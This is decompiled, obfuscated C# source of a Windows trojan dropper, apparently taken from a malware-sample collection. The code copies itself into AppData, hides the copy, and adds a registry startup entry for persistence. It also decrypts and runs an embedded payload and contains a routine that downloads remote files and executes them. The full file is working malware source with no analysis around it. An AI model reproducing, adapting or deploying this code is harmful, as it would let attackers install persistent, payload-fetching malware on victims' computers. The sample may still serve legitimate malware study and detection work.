// Decompiled with JetBrains decompiler
// Type: 
// Assembly: sss, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EBCDE7A5-28C8-4748-9965-2C957458694F
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Dapato.barv-ef51931e99c6d1c20177b7b50120d339e744fafaf01a9c0442e6174f5de2600c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using xKdll;

[StandardModule]
internal sealed class \u0008
{
  private static ResourceManager \u0002;
  private static string \u0003;
  private static byte[] \u0005;
  private static string \u0008;
  private static byte[] \u0006;
  private static Random \u000E;
  private static string \u000F;

  static \u0008()
  {
    ResourceManager resourceManager = new ResourceManager(\u000F.\u0002(-748565612), Assembly.GetExecutingAssembly());
    if (true)
      goto label_4;
label_1:
    string str = SoBPwOzEeSQKbZv.yeKVGSGwwqeIONJk(\u0008.\u0002.GetString(\u000F.\u0002(-748565612)), \u000F.\u0002(-748565627));
    if (true)
      goto label_5;
label_2:
    byte[] bytes = Encoding.GetEncoding(1252).GetBytes(\u0008.\u0003);
    if (true)
      goto label_6;
label_3:
    \u0008.\u0008 = Assembly.GetExecutingAssembly().Location;
    \u0008.\u0006 = System.IO.File.ReadAllBytes(\u0008.\u0008);
    \u0008.\u000E = new Random();
    \u0008.\u000F = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u000F.\u0002(-748565571) + Conversions.ToString(\u0008.\u000E.Next(1000, 9999)) + \u000F.\u0002(-748565595);
    return;
label_6:
    \u0008.\u0005 = bytes;
    goto label_3;
label_5:
    \u0008.\u0003 = str;
    goto label_2;
label_4:
    \u0008.\u0002 = resourceManager;
    goto label_1;
  }

  [STAThread]
  public static void \u0002()
  {
    if (!\u0008.\u0008.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
      \u0008.\u0003();
    SoBPwOzEeSQKbZv.YLIWEfgvwyeGfwekgfjkgwekjfgwEJKgweJfgwJLEK(\u0008.\u0005, true, (string) null);
    if (true)
      ;
    \u0008.\u0002(string.Empty);
  }

  public static void \u0003() => \u0005.\u0002().FileSystem.WriteAllBytes(\u0008.\u000F, \u0008.\u0006, false);

  public static void \u0005()
  {
    WebClient webClient1 = new WebClient();
    if (true)
      goto label_4;
label_1:
    string[] strArray1 = new string[1];
    if (true)
      goto label_5;
label_2:
    string[] strArray2;
    strArray2[0] = string.Empty;
    string[] strArray3 = strArray2;
    if (true)
      goto label_6;
label_3:
    string[] strArray4;
    int num = checked (strArray4.Length - 1);
    int index = 0;
    WebClient webClient2;
    while (index <= num)
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u000F.\u0002(-748565571) + Conversions.ToString(\u0008.\u000E.Next(1000, 9999)) + \u000F.\u0002(-748565595);
      webClient2.DownloadFile(strArray4[index], str);
      Interaction.Shell(str);
      checked { ++index; }
    }
    return;
label_6:
    strArray4 = strArray3;
    goto label_3;
label_5:
    strArray2 = strArray1;
    goto label_2;
label_4:
    webClient2 = webClient1;
    goto label_1;
  }

  public static void \u0002(string _param0)
  {
    try
    {
      RegistryKey currentUser = Registry.CurrentUser;
      if (true)
        goto label_3;
label_1:
      RegistryKey registryKey1;
      RegistryKey registryKey2 = registryKey1.OpenSubKey(\u000F.\u0002(-748565552), true);
      if (true)
        goto label_4;
label_2:
      RegistryKey registryKey3;
      registryKey3.SetValue(_param0, (object) \u0008.\u000F, RegistryValueKind.String);
      registryKey3.Flush();
      registryKey3.Close();
      return;
label_4:
      registryKey3 = registryKey2;
      goto label_2;
label_3:
      registryKey1 = currentUser;
      goto label_1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0003(string _param0)
  {
    try
    {
      RegistryKey currentUser = Registry.CurrentUser;
      if (true)
        goto label_3;
label_1:
      RegistryKey registryKey1;
      RegistryKey registryKey2 = registryKey1.OpenSubKey(\u000F.\u0002(-748565552), true);
      if (true)
        goto label_4;
label_2:
      RegistryKey registryKey3;
      registryKey3.DeleteValue(_param0, true);
      registryKey3.Flush();
      registryKey3.Close();
      return;
label_4:
      registryKey3 = registryKey2;
      goto label_2;
label_3:
      registryKey1 = currentUser;
      goto label_1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void \u0008()
  {
    Thread.Sleep(10000);
    if (!\u0008.\u0002(\u000F.\u0002(-748565532)))
    {
      SoBPwOzEeSQKbZv.YLIWEfgvwyeGfwekgfjkgwekjfgwEJKgweJfgwJLEK(\u0008.\u0005, true, (string) null);
      if (true)
        ;
    }
    \u0008.\u0008();
  }

  public static void \u0006()
  {
    Thread.Sleep(10000);
    \u0008.\u0003(string.Empty);
    \u0008.\u0002(string.Empty);
    \u0008.\u0008();
  }

  public static void \u000E()
  {
    try
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (true)
        goto label_2;
label_1:
      string Right;
      if (Operators.CompareString(Application.StartupPath, Right, false) != 0)
      {
        FileSystem.FileCopy(Application.ExecutablePath, Right + \u000F.\u0002(-748565742));
        Interaction.Shell(Right + \u000F.\u0002(-748565742));
        if (true)
          goto label_5;
label_4:
        FileAttributes fileAttributes;
        System.IO.File.SetAttributes(Right + \u000F.\u0002(-748565742), fileAttributes);
        ProjectData.EndApp();
        return;
label_5:
        fileAttributes = FileAttributes.Hidden;
        goto label_4;
      }
      else
      {
        FileSystem.Kill(Interaction.Command());
        return;
      }
label_2:
      Right = folderPath;
      goto label_1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static bool \u0002(string _param0)
  {
    bool flag;
    try
    {
      Process[] processes = Process.GetProcesses();
      if (true)
        goto label_3;
label_1:
      Process[] processArray1;
      Process[] processArray2 = processArray1;
      if (true)
        goto label_4;
label_2:
      int index;
      if (true)
        index = 0;
      Process[] processArray3;
      while (index < processArray3.Length)
      {
        if (Operators.CompareString(processArray3[index].ProcessName, _param0, false) == 0)
        {
          flag = true;
          goto label_12;
        }
        else
          checked { ++index; }
      }
      flag = false;
      goto label_12;
label_4:
      processArray3 = processArray2;
      goto label_2;
label_3:
      processArray1 = processes;
      goto label_1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_12:
    return flag;
  }
}
